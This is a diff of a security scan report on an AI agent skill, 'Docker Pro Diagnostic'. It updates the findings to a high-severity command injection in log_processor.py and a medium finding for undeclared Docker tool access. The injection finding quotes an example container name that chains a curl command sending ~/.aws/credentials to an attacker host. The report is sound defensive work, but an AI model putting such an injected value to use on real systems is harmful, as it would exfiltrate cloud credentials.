@@ -1,19 +1,19 @@
 # Agent Skill Security Scan Report
 
 **Skill:** Docker Pro Diagnostic
-**Directory:** ./skills/clawhub-docker-diag
+**Directory:** /workspace/skills/clawhub-docker-diag
 **Status:** [FAIL] ISSUES FOUND
 **Max Severity:** HIGH
-**Scan Duration:** 0.79s
-**Timestamp:** 2026-02-03T15:59:22.151034
+**Scan Duration:** 20.42s
+**Timestamp:** 2026-02-06T00:24:00.748692
 
 ## Summary
 
 - **Total Findings:** 3
 - **Critical:** 0
-- **High:** 1
-- **Medium:** 0
-- **Low:** 2
+- **High:** 2
+- **Medium:** 1
+- **Low:** 0
 - **Info:** 0
 
 ## Findings
@@ -29,25 +29,25 @@
 
 **Description:** Pattern detected: subprocess.run(cmd, shell=True
 
-### LOW Severity
+#### [HIGH] Command Injection Vulnerability via Unsanitized Container Name
 
-#### [LOW] Skill name does not follow agent skills naming rules
+**Severity:** HIGH
+**Category:** command_injection
+**Rule ID:** LLM_COMMAND_INJECTION
+**Location:** log_processor.py
 
-**Severity:** LOW
-**Category:** policy_violation
-**Rule ID:** MANIFEST_INVALID_NAME
+**Description:** The log_processor.py script constructs a shell command using f-string interpolation with the user-provided container_name parameter without any input validation or sanitization. The command 'docker logs --tail {max_lines} {container_name}' is executed via subprocess.run() with shell=True, allowing arbitrary command injection. An attacker could provide a malicious container name like 'foo; curl http://attacker.com/exfil?data=$(cat ~/.aws/credentials)' to execute arbitrary commands on the host system.
+
+### MEDIUM Severity
+
+#### [MEDIUM] Unauthorized Docker Access Without Tool Restrictions
+
+**Severity:** MEDIUM
+**Category:** unauthorized_tool_use
+**Rule ID:** LLM_UNAUTHORIZED_TOOL_USE
 **Location:** SKILL.md
 
-**Description:** Skill name 'Docker Pro Diagnostic' is invalid. Agent skills require lowercase letters, numbers, and hyphens only, with a maximum length of 64 characters.
-
-#### [LOW] Skill does not specify a license
-
-**Severity:** LOW
-**Category:** policy_violation
-**Rule ID:** MANIFEST_MISSING_LICENSE
-**Location:** SKILL.md
-
-**Description:** Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.
+**Description:** The skill requires 'docker' binary access and executes Docker commands to read container logs, but the YAML manifest does not declare 'allowed-tools' restrictions. While the skill legitimately needs Docker access for its stated purpose, the absence of tool declarations means there's no explicit contract about what system capabilities this skill requires. Users cannot assess the privilege level required before installation.
 
 ## Analyzers
 
